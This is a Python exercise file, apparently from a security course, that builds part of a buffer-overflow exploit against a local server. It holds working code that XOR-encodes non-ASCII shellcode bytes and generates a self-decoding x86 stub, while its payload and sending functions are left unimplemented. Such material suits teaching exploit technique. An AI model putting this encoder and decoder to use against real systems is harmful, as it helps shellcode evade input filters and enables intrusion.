#!/usr/bin/python

import functools, os, socket, traceback, struct, assemble
import q2


HOST        = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT  = 1337


ASCII_MAX = 0x7f


def warn_invalid_ascii(selector=None):
    selector = selector or (lambda x: x)
    def decorator(func):
        @functools.wraps(func)
        def result(*args, **kwargs):
            ret = func(*args, **kwargs)
            if any(ord(c) > ASCII_MAX for c in selector(ret)):
                print('WARNING: Non ASCII chars in return value from %s at\n%s'
                      % (func.__name__, ''.join(traceback.format_stack()[:-1])))
            return ret
        return result
    return decorator


def get_raw_shellcode():
    return q2.get_shellcode()


@warn_invalid_ascii(lambda (x,y): x)
def encode(data):
    '''Encode data to be valid ASCII, by XOR-ing non ASCII bytes with 0xff.

    Return the encoded data and the indices that were XOR-ed.
    - To return multiple values, do `return a, b`
    - To get multiple returned values do `a, b = encode(data)`
    '''
    # TODO: IMPLEMENT THIS FUNCTION
    xor_indces = []
    new_shellcode = ""
    ascii_xor = 0xff
    for i in range(len(data)):
        code_byte = struct.unpack("B", data[i])[0] # convert to unsigned byte numeric type
        if code_byte > ASCII_MAX:
            code_byte ^= ascii_xor # xor with 0xff
            code_byte = struct.pack("B", code_byte) # pack again to unsigned byte
            new_shellcode += code_byte # append to new shellcode
            xor_indces.append(i) # mark index that was xor'ed
        else:
            new_shellcode += data[i] # else, don't change index

    return new_shellcode, xor_indces


@warn_invalid_ascii()
def get_decoder(indices):
    '''Return the assembled decoder code.'''
    # TODO: IMPLEMENT THIS FUNCTION
    decoder_assembly = ""
    create_ff = "push 0; pop ebx; dec ebx;" # insert into ebx the value ff with only ascii chars
    init_edx = "push 0; pop edx;" # initiate edx to zero
    decoder_assembly += create_ff + init_edx

    edx_current_value = 0
    for i in indices:
        edx_i_diff = i - edx_current_value # this is how much we should increment edx for current i vaule
        inc = "inc edx;" * edx_i_diff # do as much increment as needed
        xr = "xor byte ptr [eax + edx], BL;" # then, perform the decoding
        decoder_assembly += inc + xr # update our decoder code
        edx_current_value += edx_i_diff # update current edx value

    decoder = assemble.assemble_data(decoder_assembly) # assemble our code
    return decoder


@warn_invalid_ascii()
def get_shellcode():
    '''This function returns the machine code (bytes) of the shellcode.

    This does not include the size, return address, nop slide or anything else!
    From this function you should return only the shellcode!
    '''
    q2_shellcode = get_raw_shellcode()
    # TODO: IMPLEMENT THIS FUNCTION
    raise NotImplementedError()


@warn_invalid_ascii(lambda x: x[4:-4])
def get_payload():
    '''This function returns the data to send over the socket to the server.

    This includes everything - the 4 bytes for size, the nop slide, the
    shellcode and the return address.
    '''
    # TODO: IMPLEMENT THIS FUNCTION
    raise NotImplementedError()


def main():
    get_decoder([1,5,10,12, 22])
    # payload = get_payload()
    # conn = socket.socket()
    # conn.connect((HOST, SERVER_PORT))
    # try:
    #     conn.sendall(payload)
    # finally:
    #     conn.close()


if __name__ == '__main__':
    main()
